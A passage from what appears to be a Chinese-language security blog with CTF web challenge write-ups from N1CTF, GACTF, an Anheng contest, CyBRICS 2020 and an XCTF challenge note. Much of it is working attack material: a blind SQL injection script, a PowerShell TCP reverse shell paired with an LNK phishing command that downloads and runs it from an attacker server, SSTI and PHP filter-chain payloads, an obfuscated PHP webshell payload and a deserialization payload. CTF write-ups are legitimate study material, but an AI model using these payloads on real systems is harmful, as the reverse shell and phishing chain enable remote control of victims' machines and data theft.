mid((select(group_concat(column_name))from(information_schema.columns)where(table_name=\'n1key\')),&#123;&#125;,1))=&#123;&#125;'</span></span><br><span class="line"><span class="comment">#payload = 'ascii(mid((select(key)from(n1key)),&#123;&#125;,1))=&#123;&#125;'</span></span><br><span class="line">payload = <span class="string">'ascii(mid((select binary `2`from(select 1,2 union select * from n1key)a limit 1,1),&#123;&#125;,1))=&#123;&#125;'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">result = <span class="string">''</span></span><br><span class="line">headers = &#123;<span class="string">'X-Forwarded-For'</span>:<span class="string">''</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">999</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">128</span>):</span><br><span class="line">        headers[<span class="string">'X-Forwarded-For'</span>] = xff.format(payload.format(i,j))</span><br><span class="line">        res = requests.get(url,headers=headers)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'&lt;code&gt;welcome'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            result += chr(j)</span><br><span class="line">            print(result)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j==<span class="number">127</span>:</span><br><span class="line">            print(<span class="string">'finish'</span>)</span><br></pre></td></tr></table></figure>

<h2 id="The-King-Of-Phish-Victim-Bot"><a href="#The-King-Of-Phish-Victim-Bot" class="headerlink" title="The King Of Phish (Victim Bot)"></a>The King Of Phish (Victim Bot)</h2><p>windows下lnk文件钓鱼，而且限制了执行的命令不能有空格，可以用%CommonProgramFiles:<del>10,1%来代替空格。使用工具<a href="https://github.com/Plazmaz/LNKUp" target="_blank" rel="noopener">https://github.com/Plazmaz/LNKUp</a> 来生成恶意lnk文件，为了使最终的payload无空格，需要对这个工具进行修改，把121行改为`link.arguments = ‘/c%CommonProgramFiles:</del>10,1%’  + target`。在自己的vps上放恶意脚本lltest_tcp.ps1，内容如下：</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> Invoke-lltestTcp</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$client</span> = <span class="built_in">New-Object</span> Net.Sockets.TCPClient(<span class="string">'yourip'</span>,yourport)</span><br><span class="line"><span class="variable">$stream</span> = <span class="variable">$client</span>.GetStream();[byte[]]<span class="variable">$bytes</span> = <span class="number">0</span>..<span class="number">65535</span>|%&#123;<span class="number">0</span>&#125;</span><br><span class="line"><span class="keyword">while</span>((<span class="variable">$i</span> = <span class="variable">$stream</span>.Read(<span class="variable">$bytes</span>, <span class="number">0</span>, <span class="variable">$bytes</span>.Length)) <span class="nomarkup">-ne</span> <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="variable">$data</span> = (<span class="built_in">New-Object</span> -TypeName System.Text.ASCIIEncoding).GetString(<span class="variable">$bytes</span>,<span class="number">0</span>, <span class="variable">$i</span>)</span><br><span class="line"><span class="variable">$sendback</span> = (iex <span class="variable">$data</span> <span class="number">2</span>&gt;&amp;<span class="number">1</span> | <span class="built_in">Out-String</span> )</span><br><span class="line"><span class="variable">$sendback2</span> = <span class="variable">$sendback</span> + <span class="string">'PS '</span> + (pwd).Path + <span class="string">'&gt; '</span></span><br><span class="line"><span class="variable">$sendbyte</span> = ([text.encoding]::ASCII).GetBytes(<span class="variable">$sendback2</span>)</span><br><span class="line"><span class="variable">$stream</span>.Write(<span class="variable">$sendbyte</span>,<span class="number">0</span>,<span class="variable">$sendbyte</span>.Length)</span><br><span class="line"><span class="variable">$stream</span>.Flush()</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$client</span>.Close()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后执行命令：<code>python2 generate.py --host localhost --type ntlm --output out.lnk --execute &quot;powershell%CommonProgramFiles:~10,1%IEX%CommonProgramFiles:~10,1%(New-Object%CommonProgramFiles:~10,1%Net.WebClient).DownloadString(&#39;http://yourip/lltest_tcp.ps1&#39;);Invoke-lltestTcp&quot;</code>生成payload，nc监听即可接收反弹的powershell</p>
<h2 id="filters"><a href="#filters" class="headerlink" title="filters"></a>filters</h2><p>各种filter嵌套多层后会只留下一个字符，通过fuzz来测试出所需字符。由于代码中会让数组乱序，故为了更容易产生想要的shell需要payload尽量短，即&lt;?=`ls`;，把所需字符fuzz出来排好序，然后一直访问等待输出flag即可。exp:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://101.32.188.147:23333/'</span></span><br><span class="line">payload = <span class="string">'''string.strip_tags|string.toupper|convert.base64-decode|convert.base64-decode|convert.quoted-printable-encode|convert.base64-encode|string.rot13|convert.base64-decode|convert.base64-encode|string.toupper|convert.base64-encode|convert.base64-decode|string.tolower|string.rot13|convert.base64-encode|string.toupper|string.rot13|convert.base64-decode|string.rot13|string.toupper|convert.base64-encode|convert.base64-encode|convert.base64-decode|convert.base64-decode|convert.base64-decode/string.strip_tags|string.toupper|convert.base64-decode|convert.base64-decode|convert.quoted-printable-encode|convert.base64-encode|string.rot13|convert.base64-encode|string.tolower|convert.base64-encode|string.rot13|string.toupper|convert.base64-encode|convert.base64-encode|convert.base64-decode|convert.base64-decode|convert.base64-decode/string.strip_tags|string.toupper|convert.base64-decode|convert.base64-decode|convert.quoted-printable-encode|convert.base64-encode|string.rot13|convert.base64-decode|convert.base64-encode|string.toupper|convert.base64-encode|convert.base64-decode|string.tolower|string.rot13|convert.base64-encode|string.toupper|string.rot13|convert.base64-decode|string.rot13|convert.base64-encode|convert.base64-encode|convert.base64-decode|convert.base64-decode|convert.base64-decode/string.strip_tags|string.toupper|convert.base64-decode|convert.base64-decode|convert.quoted-printable-encode|convert.base64-encode|string.rot13|string.tolower|convert.base64-encode|string.rot13|convert.base64-encode|convert.base64-encode|string.toupper|convert.base64-encode|convert.base64-encode|convert.base64-decode|convert.base64-decode|convert.base64-decode/string.strip_tags|string.toupper|convert.base64-decode|convert.base64-decode|convert.quoted-printable-encode|convert.base64-encode|string.rot13|convert.base64-decode|convert.base64-encode|string.toupper|convert.base64-encode|convert.base64-decode|string.rot13|convert.base64-encode|string.toupper|convert.base64-decode|convert.base64-decode|string.rot13|string.tolower/string.strip_tags|convert.base64-decode|string.rot13|convert.base64-decode|convert.base64-encode|convert.base64-encode|convert.base64-encode|convert.base64-encode|convert.base64-encode|convert.base64-decode|convert.base64-decode|convert.base64-decode|string.tolower/string.strip_tags|string.toupper|convert.base64-decode|convert.base64-decode|convert.quoted-printable-encode|convert.base64-encode|string.rot13|string.tolower|convert.base64-encode|string.rot13|convert.base64-encode|convert.base64-encode|string.toupper|convert.base64-encode|convert.base64-encode|convert.base64-decode|convert.base64-decode|convert.base64-decode/string.strip_tags|string.rot13|convert.base64-decode|convert.base64-decode|convert.base64-encode|string.tolower|convert.base64-decode|string.rot13|convert.base64-encode|string.rot13|convert.base64-encode|string.rot13|string.toupper|convert.base64-encode|convert.base64-encode|convert.base64-decode|convert.base64-decode|convert.base64-decode'''</span></span><br><span class="line">data = &#123;<span class="string">'filters'</span>:payload&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = requests.post(url,data=data)</span><br><span class="line">    print(res.text)</span><br><span class="line">    sleep(<span class="number">0.2</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">'n1ctf'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">        print(res.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/08/31/GACTF-web%E9%A2%98%E8%A7%A3/">GACTF_web题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-31</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><h2 id="EZFLASK"><a href="#EZFLASK" class="headerlink" title="EZFLASK"></a>EZFLASK</h2><p>给了部分源码，可以进行eval。传入任意函数名.__globals__可以查看全局变量，发现admin的路由/h4rdt0f1nd_9792uagcaca00qjaf。访问该路由可以发现是个ssrf，调用了python的requests库。由于requests默认追踪302跳转，故可以在自己的vps上放置302跳转来绕过对于本地的限制，扫描主机端口发现5000还开着一个flask，存在无过滤的sti，直接打即可getflag。</p>
<h2 id="SimpleFlask"><a href="#SimpleFlask" class="headerlink" title="SimpleFlask"></a>SimpleFlask</h2><p>可以利用<code>joiner.__init__.__globals__[&quot;__builtins__&quot;][&quot;open&quot;](&quot;/sys/class/net/eth0/address&quot;).read()</code>来读文件，而且开了debug，该payload读不存在文件会触发。然而算出的pin码有误，故尝试rce。经测试<code>[&quot;op&quot;&quot;en&quot;]</code>等价于<code>[&quot;op&quot;+&quot;en&quot;]</code>，故可以这样rce：<code>joiner.__init__.__globals__[&quot;__builtins__&quot;][&quot;__impo&quot;&quot;rt__&quot;](&quot;o&quot;&quot;s&quot;)[&quot;po&quot;&quot;pen&quot;](&quot;pwd&quot;).read()</code>然而无法绕过空格过滤。最后只能利用这个来绕过flag关键字的过滤，最终payload:<code>joiner.__init__.__globals__[&quot;__builtins__&quot;][&quot;open&quot;](&quot;/fl&quot;&quot;ag&quot;).read()</code></p>
<h2 id="XWiki"><a href="#XWiki" class="headerlink" title="XWiki"></a>XWiki</h2><p>直接用cve就可以打rce，参考链接：<a href="https://jira.xwiki.org/browse/XWIKI-16960" target="_blank" rel="noopener">https://jira.xwiki.org/browse/XWIKI-16960</a></p>
<p>最后要执行一个/readflag,但是比完463次大小后也不给flag，最后脑洞到输入的01是flag的二进制，转成字符即可。</p>
<h2 id="carefulyes"><a href="#carefulyes" class="headerlink" title="carefulyes"></a>carefulyes</h2><p>rename.php处有一个二次注入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($req[<span class="string">'oldname'</span>]) &amp;&amp; <span class="keyword">isset</span>($req[<span class="string">'newname'</span>])) &#123;</span><br><span class="line">    $result = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$req['oldname']&#125;'"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($result-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        $result = $result-&gt;fetch_assoc();</span><br><span class="line">        $info = $db-&gt;query(<span class="string">"select * from `file` where `filename`='&#123;$result['filename']&#125;'"</span>);</span><br><span class="line">        $info = $info-&gt;fetch_assoc();</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"oldfilename : "</span>.$info[<span class="string">'filename'</span>].<span class="string">" will be changed."</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">exit</span>(<span class="string">"old file doesn't exists!"</span>);</span><br></pre></td></tr></table></figure>

<p>这里直接把查询出的$result[‘filename’]代入下一个查询，并且会回显执行结果$info[‘filename’]。而filename是上传时可控的，所以我们只需先上传精心构造的文件名，再将其重命名，通过union注入来回显我们想要的数据。<img src="/2020/08/31/GACTF-web%E9%A2%98%E8%A7%A3/1.png" alt></p>
<p>然后直接重命名这个文件就能看到用户名等数据。然后上传的同时直接打反序列化即可。payload:upload.php?data=O%3A6%3A%22XCTFGG%22%3A2%3A%7Bs%3A14%3A%22%00XCTFGG%00method%22%3Bs%3A5%3A%22login%22%3Bs%3A12%3A%22%00XCTFGG%00args%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A2%3A%22XM%22%3Bi%3A1%3Bs%3A9%3A%22qweqweqwe%22%3B%7D%7D</p>
<h2 id="babyshop"><a href="#babyshop" class="headerlink" title="babyshop"></a>babyshop</h2><p>.git泄露源码，是用中文变量函数名而且还存在混淆写成的。通过var_dump来输出中文函数的返回值来推测他的功能，最后在念经这个函数发现了问题。这个函数用于输出notes，调用了类的归纳函数，其代码如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> 归纳<span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (string) @造化(<span class="string">"沃实泡畏汽吨悔孟沙余纪转冻哥悄便披乎呀段坡汇舌天"</span>)(<span class="keyword">$this</span>-&gt;朝拜圣地 . 造化(<span class="string">"早哥倾逃披乎吨转"</span>) . <span class="keyword">$this</span>-&gt;贡品);</span><br><span class="line">		<span class="comment">//file_get_contents   读notes</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里直接用file_get_contents来读取事先写好的notes_sessionid，即$this-&gt;贡品是sessionid，所以这里可以通过控制sessionid实现任意文件读取，直接读根目录的flag。本身漏洞难度并不大，然而藏在混淆的代码里很难发现。</p>
<p><img src="/2020/08/31/GACTF-web%E9%A2%98%E8%A7%A3/2.png" alt></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/08/25/%E5%AE%89%E6%81%92%E6%9D%AF8%E6%9C%88%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/">安恒杯8月赛web题解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-25</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><h2 id="web1"><a href="#web1" class="headerlink" title="web1"></a>web1</h2><p>注册以后的发到邮箱里的验证链接的用户名处存在sql报错注入，无waf，直接注入即可，这很真实环境。</p>
<h2 id="ezflask"><a href="#ezflask" class="headerlink" title="ezflask"></a>ezflask</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span><span class="params">(s)</span>:</span></span><br><span class="line">        blacklist = [<span class="string">'class'</span>, <span class="string">'attr'</span>, <span class="string">'mro'</span>, <span class="string">'base'</span>,</span><br><span class="line">                     <span class="string">'request'</span>, <span class="string">'session'</span>, <span class="string">'+'</span>, <span class="string">'add'</span>, <span class="string">'chr'</span>, <span class="string">'ord'</span>, <span class="string">'redirect'</span>, <span class="string">'url_for'</span>, <span class="string">'config'</span>, <span class="string">'builtins'</span>, <span class="string">'get_flashed_messages'</span>, <span class="string">'get'</span>, <span class="string">'subclasses'</span>, <span class="string">'form'</span>, <span class="string">'cookies'</span>, <span class="string">'headers'</span>, <span class="string">'['</span>, <span class="string">']'</span>, <span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'&#123;&#125;'</span>]</span><br></pre></td></tr></table></figure>

<p>黑名单过滤了挺多，我的解应该是非预期。</p>
<p>中括号以及url_for等模板内置函数的过滤让ssti链较难构造，不过还是可以通过<code>self.__dict__</code>来看看还有没有什么可以直接在模板里访问，作为ssti链起始的。最后发现了joiner，用<code>joiner.__init__.__globals__</code>能获取全局变量，但是attr和中括号的过滤使得我们无法利用[‘xxx’]和|attr(‘xxx’)来取元素，而且引号以及request和加号的过滤让我们无法写字符串参数，所以这里我用了set来构造任意字符串：</p>
<p><img src="/2020/08/25/%E5%AE%89%E6%81%92%E6%9D%AF8%E6%9C%88%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/1.png" alt></p>
<p>原理简单说是先凑出一个%c，然后利用python的格式化字符串语法来获取任意ascii对应的字符，利用模板的dict|join来达到连接字符的效果，这里要注意dict的键值不能相同，否则会覆盖。这里产生了<code>__builtins__</code>，<code>open</code>，<code>/flag</code>三个字符串。然后在ssti链里用pop来取参数，payload为<code>joiner.__init__.__globals__.pop(c1).pop(c2)(c3).read()</code>，先pop出__builtins__，然后再pop出open函数，再用/flag作为open的参数，然后读取。完整payload：</p>
<p><img src="/2020/08/25/%E5%AE%89%E6%81%92%E6%9D%AF8%E6%9C%88%E8%B5%9Bweb%E9%A2%98%E8%A7%A3/2.png" alt></p>
<h2 id="ezrce"><a href="#ezrce" class="headerlink" title="ezrce"></a>ezrce</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_=<span class="keyword">array</span>(<span class="string">'a'</span>,<span class="string">'b'</span>,<span class="string">'c'</span>,<span class="string">'d'</span>,<span class="string">'e'</span>,<span class="string">'f'</span>,<span class="string">'g'</span>,<span class="string">'h'</span>,<span class="string">'i'</span>,<span class="string">'j'</span>,<span class="string">'k'</span>,<span class="string">'m'</span>,<span class="string">'n'</span>,<span class="string">'l'</span>,<span class="string">'o'</span>,<span class="string">'p'</span>,<span class="string">'q'</span>,<span class="string">'r'</span>,<span class="string">'s'</span>,<span class="string">'t'</span>,<span class="string">'u'</span>,<span class="string">'v'</span>,<span class="string">'w'</span>,<span class="string">'x'</span>,<span class="string">'y'</span>,<span class="string">'z'</span>,<span class="string">'@'</span>,<span class="string">'\~'</span>,<span class="string">'\^'</span>,<span class="string">'\['</span>,<span class="string">'\]'</span>,<span class="string">'\&amp;'</span>,<span class="string">'\?'</span>,<span class="string">'\&lt;'</span>,<span class="string">'\&gt;'</span>,<span class="string">'\*'</span>,<span class="string">'1'</span>,<span class="string">'2'</span>,<span class="string">'3'</span>,<span class="string">'4'</span>,<span class="string">'5'</span>,<span class="string">'6'</span>,<span class="string">'7'</span>,<span class="string">'8'</span>,<span class="string">'9'</span>,<span class="string">'0'</span>);</span><br></pre></td></tr></table></figure>

<p>黑名单留了$，_以及/，+，;等字符，足以构建一个webshell。基本思路是通过(‘!’==’!’)/(‘!’==’<em>‘)即1/0来获得数字INF，然后把INF.’\</em>‘来获得字符串INF_，然后INF_{1}获得字符N，N保存到变量$_里后，$_++获得O。Z++变为AA，再{1}获得A，这样就能获得所有字母。然后拼接出$_=_GET，直接${$_}{‘_‘}(${$_}{‘__‘})执行命令即可。贴一个payload:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'_'</span>);$_=(<span class="string">'!'</span>==<span class="string">'!'</span>)/(<span class="string">'!'</span>==<span class="string">'_'</span>);$_=$_.(_);$__=$_&#123;<span class="string">'!'</span>==<span class="string">'!'</span>&#125;;$__++;$__++;$__++;$__++;$_______=$__;$__++;$____=$__.$__.$__;$__++;$______=$__;$____=$____.$__;$__++;$__++;$__++;$__++;$__++;$____&#123;<span class="string">'_'</span>==<span class="string">'_'</span>&#125;=$__;$__++;$__++;$__=$__&#123;<span class="string">'!'</span>==<span class="string">'_'</span>&#125;;$__++;$__++;$__++;$__++;$____=$____.$__;$_____=$__.$______;$__++;$__++;$_____=$__.$_____;$_____=<span class="string">'_'</span>.$_____;$__++;$__++;$__++;$__++;$__++;$__++;$____=$____.$__;($&#123;$_____&#125;&#123;<span class="string">'__'</span>&#125;)($&#123;$_____&#125;&#123;<span class="string">'_'</span>&#125;);<span class="comment">//</span></span><br></pre></td></tr></table></figure></div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/08/03/CyBRICS2020-web-writeup/">CyBRICS2020 web writeup</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-08-03</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><h2 id="Gif2Png"><a href="#Gif2Png" class="headerlink" title="Gif2Png"></a>Gif2Png</h2><p>功能挺简单，传文件和下载。在上传文件的文件名处可以看到一个明显的命令注入，但是存在过滤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> <span class="keyword">not</span> bool(re.match(<span class="string">"^[a-zA-Z0-9_\-. '\"\=\$\(\)\|]*$"</span>, file.filename)) <span class="keyword">or</span> <span class="string">".."</span> <span class="keyword">in</span> file.filename:</span><br><span class="line">            logging.debug(<span class="string">f'Invalid symbols in filename: <span class="subst">&#123;file.content_type&#125;</span>'</span>)</span><br><span class="line">            flash(<span class="string">'Invalid filename'</span>, <span class="string">'danger'</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(request.url)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">省略</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">	command = subprocess.Popen(<span class="string">f"ffmpeg -i 'uploads/<span class="subst">&#123;file.filename&#125;</span>'\"uploads/<span class="subst">&#123;uid&#125;</span>/%03d.png\""</span>, shell=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>

<p>存在一些符号的过滤，但是可以通过base64编码+管道符解码执行来绕过，测试时发现环境无法通外网，使得外带数据和反弹shell都无效。不过看代码的upload路由</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/uploads/&lt;uid&gt;/&lt;image&gt;')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image</span><span class="params">(uid, image)</span>:</span></span><br><span class="line">    logging.debug(request.headers)</span><br><span class="line">    dir = str(Path(app.config[<span class="string">'UPLOAD_FOLDER'</span>]) / uid)</span><br><span class="line">    <span class="keyword">return</span> send_from_directory(dir, image)</span><br></pre></td></tr></table></figure>

<p>可以想到利用命令执行把执行结果写道uploads/uid目录下然后直接访问即可，故最终payload</p>
<p><img src="/2020/08/03/CyBRICS2020-web-writeup/1.png" alt></p>
<p><img src="/2020/08/03/CyBRICS2020-web-writeup/2.png" alt></p>
<h2 id="WoC"><a href="#WoC" class="headerlink" title="WoC"></a>WoC</h2><p>web端计算器一定存在eval等动态执行的调用，然而检测计算式的正则十分复杂，难以绕过。然后在newtemplate.php里发现了一处可控的写入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (trim(@$_POST[<span class="string">'html'</span>])) &#123;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        $html = trim($_POST[<span class="string">'html'</span>]);</span><br><span class="line">        <span class="keyword">if</span> (strpos($html, <span class="string">'&lt;?'</span>) !== <span class="keyword">false</span>) &#123;</span><br><span class="line">            $error = <span class="string">"Bad chars"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $requiredBlocks = [<span class="comment">/**/</span>];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($requiredBlocks <span class="keyword">as</span> $block) &#123;</span><br><span class="line">            <span class="keyword">if</span> (strpos($html, $block) === <span class="keyword">false</span>) &#123;</span><br><span class="line">                $error = <span class="string">"Missing required block: '$block'"</span>;</span><br><span class="line">                <span class="keyword">break</span>(<span class="number">2</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $uuid = uuid();</span><br><span class="line">        <span class="keyword">if</span> (!file_put_contents(<span class="string">"calcs/$userid/templates/$uuid.html"</span>, $html)) &#123;</span><br><span class="line">            $error = <span class="string">"Unexpected error! Contact orgs to fix. cybrics.net/rules#contacts"</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>检测了&lt;?头导致无法写入php的shell。但是在calc.php里有这样的一个写入：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (@$_POST[<span class="string">'share'</span>]) &#123;</span><br><span class="line">            $calc = uuid();</span><br><span class="line">            file_put_contents(<span class="string">"calcs/$userid/$calc.php"</span>, <span class="string">"&lt;script&gt;var preloadValue = &lt;?=json_encode((string)($field))?&gt;;&lt;/script&gt;\n"</span> . file_get_contents(<span class="string">"inc/calclib.html"</span>) . file_get_contents(<span class="string">"calcs/$userid/templates/$template.html"</span>));</span><br></pre></td></tr></table></figure>

<p>$field为输入的计算式，最后拼接的文件是自定义的模板。所以这里可以令计算式为/<em>，恰好是除号和乘号不会被正则检测，然后自定义的模板处补上\</em>/注释掉了中间的语句，使得&lt;?=可以作为我们自定义模板的标签头。然后就是写shell了，payload如下：</p>
<p><code>*/11));eval($_REQUEST[1]);?&gt;id=&quot;back&quot;&#39;,（补充其他的需求字符）</code></p>
<p>获取自定义的模板的名称，然后写shell</p>
<p><img src="/2020/08/03/CyBRICS2020-web-writeup/3.png" alt></p>
<p>​      访问返回的php文件路径执行shell即可</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E8%B5%9Bfmkq%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/">XCTF高校战“疫”赛fmkq出题笔记</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-03-10</time><span class="article-meta tags"><span class="article-meta__separator">|</span><i class="fa fa-tag article-meta__icon" aria-hidden="true"></i><a class="article-meta__tags" href="/tags/CTF/">CTF</a></span><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在接出题的活之前正好研究了一下python里格式化字符串的利用(具体可以看前边的文章），所以就直接拿这个知识点来出了一道题目。至于题目名fmkq的选取来源于这个地方：</p>
<p><img src="/2020/03/10/XCTF%E9%AB%98%E6%A0%A1%E6%88%98%E2%80%9C%E7%96%AB%E2%80%9D%E8%B5%9Bfmkq%E5%87%BA%E9%A2%98%E7%AC%94%E8%AE%B0/fmkq.jpg" alt></p>
<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>进入题目环境先是一个php的ssrf：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'head'</span>])&amp;&amp;<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123; </span><br><span class="line">    $begin = <span class="string">"The number you want: "</span>; </span><br><span class="line">    extract($_GET); </span><br><span class="line">    <span class="keyword">if</span>($head==<span class="string">''</span>) &#123; </span><br><span class="line">		<span class="keyword">die</span>(<span class="string">'Where is you head?'</span>); </span><br><span class="line"></span><br><span class="line">	&#125; </span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/log/i'</span>,$url))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'No No No'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/[A-Za-z0-9]/i'</span>,$head))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">'Head can\'t be like this!'</span>); </span><br><span 